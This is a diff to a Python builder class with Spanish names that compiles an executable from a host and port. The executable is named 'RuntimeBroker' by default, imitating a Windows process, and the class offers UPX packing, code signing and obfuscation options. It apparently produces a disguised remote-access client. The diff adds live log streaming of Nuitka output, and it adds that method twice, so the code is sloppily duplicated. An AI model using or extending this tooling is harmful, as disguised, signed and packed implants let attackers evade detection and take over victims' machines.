@@ -24,7 +24,7 @@ ES_WIN = sys.platform.startswith("win")
 class Constructor:
     def __init__(self, host, puerto, log=None, nombre="RuntimeBroker",
                  icono=None, upx=None, certificado=None, contrasena_cert=None,
-                 compilador="auto", lto=False, mingw=False, usar_pyarmor=True):
+                 compilador="auto", lto=False, mingw=False, usar_pyarmor=False):
         self.host = (host or "127.0.0.1").strip()
         self.puerto = str(puerto or "8000").strip()
         self.log = log or (lambda t: None)
@@ -259,20 +259,60 @@ class Constructor:
         cmd.append("_entry.py")
         return cmd
 
+    def _correr_stream(self, cmd, cwd):
+        """Ejecuta un comando mostrando la salida en vivo en el log."""
+        self.log("[builder] $ " + " ".join(str(c) for c in cmd))
+        p = subprocess.Popen(cmd, cwd=cwd, stdout=subprocess.PIPE,
+                             stderr=subprocess.STDOUT, text=True,
+                             encoding="utf-8", errors="replace", bufsize=1)
+        ultimas = []
+        for ln in p.stdout:
+            ln = ln.rstrip()
+            if not ln:
+                continue
+            ultimas.append(ln)
+            del ultimas[:-25]
+            if any(k in ln for k in ("Nuitka", "Compiling", "Scons", "gcc",
+                                     "cl.exe", "link.exe", "Progress", "error",
+                                     "Error", "download", "cache", "backend")):
+                self.log("[nuitka] " + ln)
+        p.wait()
+        return p.returncode, "\n".join(ultimas)
+
+    def _correr_stream(self, cmd, cwd):
+        """Ejecuta un comando mostrando la salida en vivo en el log."""
+        self.log("[builder] $ " + " ".join(str(c) for c in cmd))
+        p = subprocess.Popen(cmd, cwd=cwd, stdout=subprocess.PIPE,
+                             stderr=subprocess.STDOUT, text=True,
+                             encoding="utf-8", errors="replace", bufsize=1)
+        ultimas = []
+        for ln in p.stdout:
+            ln = ln.rstrip()
+            if not ln:
+                continue
+            ultimas.append(ln)
+            del ultimas[:-25]
+            if any(k in ln for k in ("Nuitka", "Compiling", "Scons", "gcc",
+                                     "cl.exe", "link.exe", "Progress", "error",
+                                     "Error", "download", "cache", "backend")):
+                self.log("[nuitka] " + ln)
+        p.wait()
+        return p.returncode, "\n".join(ultimas)
+
     def _compilar_nuitka(self, dist_tmp, runtime):
         exe = os.path.join(dist_tmp, self.nombre + (".exe" if ES_WIN else ""))
         intentos = [["--mingw64"]] if self.mingw else [[], ["--mingw64"]]
         for extra in intentos:
             self.log(f"[builder] compilando con Nuitka {extra or '[MSVC]'}... (varios minutos)")
             try:
-                proc = subprocess.run(self._nuitka_cmd(dist_tmp, extra, runtime),
-                                      cwd=self.build, capture_output=True, text=True)
+                rc, cola = self._correr_stream(
+                    self._nuitka_cmd(dist_tmp, extra, runtime), self.build)
             except Exception as e:
                 self.log(f"[builder] Nuitka excepción: {e}")
                 continue
-            if proc.returncode == 0 and os.path.isfile(exe):
+            if rc == 0 and os.path.isfile(exe):
                 return exe
-            self.log("[builder] Nuitka falló:\n" + (proc.stderr or proc.stdout or "")[-1500:])
+            self.log("[builder] Nuitka falló:\n" + cola[-1500:])
         return None
 
     def _compilar_pyinstaller(self, dist_tmp, runtime):
